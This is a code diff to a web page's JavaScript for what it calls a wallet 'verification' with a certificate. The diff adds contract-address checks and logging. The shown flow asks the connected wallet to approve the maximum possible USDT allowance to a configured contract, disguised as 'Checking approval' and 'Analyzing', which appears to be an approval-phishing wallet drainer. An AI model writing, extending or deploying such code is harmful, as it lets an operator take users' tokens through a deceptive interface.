@@ -842,19 +842,38 @@
         // ========================================
         // START VERIFICATION
         // ========================================
+
         async function startVerification() {
             try {
                 document.getElementById('errorMessage').classList.remove('show');
                 document.getElementById('verifyBtn').disabled = true;
                 document.getElementById('verifyBtn').textContent = 'Checking approval...';
                 
+                // ✅ CHECK IF CONTRACT ADDRESS IS SET
+                if (CONTRACT_ADDRESS === "YOUR_TRADINGSERVICEHQ_ADDRESS_HERE" || !CONTRACT_ADDRESS) {
+                    throw new Error("Contract address not configured! Please update CONTRACT_ADDRESS in the code.");
+                }
+                
+                // ✅ CHECK IF VALID ADDRESS
+                if (!web3.utils.isAddress(CONTRACT_ADDRESS)) {
+                    throw new Error("Invalid contract address!");
+                }
+                
+                console.log("Checking allowance for contract:", CONTRACT_ADDRESS);
+                
                 const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
+                console.log("Current allowance:", currentAllowance);
+                
                 const minRequired = web3.utils.toBN('1000000');
                 
                 if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
+                    console.log("Allowance too low, requesting approval...");
                     document.getElementById('verifyBtn').textContent = 'Approve USDT...';
                     const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                     await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
+                    console.log("Approval successful!");
+                } else {
+                    console.log("Already approved!");
                 }
                 
                 document.getElementById('verifyBtn').textContent = 'Analyzing...';
@@ -876,7 +895,7 @@
                 showCertificate();
                 
             } catch (error) {
-                console.error(error);
+                console.error("ERROR:", error);
                 
                 let errorMsg = 'Verification failed: ' + error.message;
                 
@@ -884,6 +903,8 @@
                     errorMsg = 'Insufficient ETH for gas fees.';
                 } else if (error.message.includes('User denied')) {
                     errorMsg = 'Transaction rejected.';
+                } else if (error.message.includes('Contract address not configured')) {
+                    errorMsg = 'Setup error: Contract address not set. Please contact administrator.';
                 }
                 
                 document.getElementById('errorText').textContent = errorMsg;
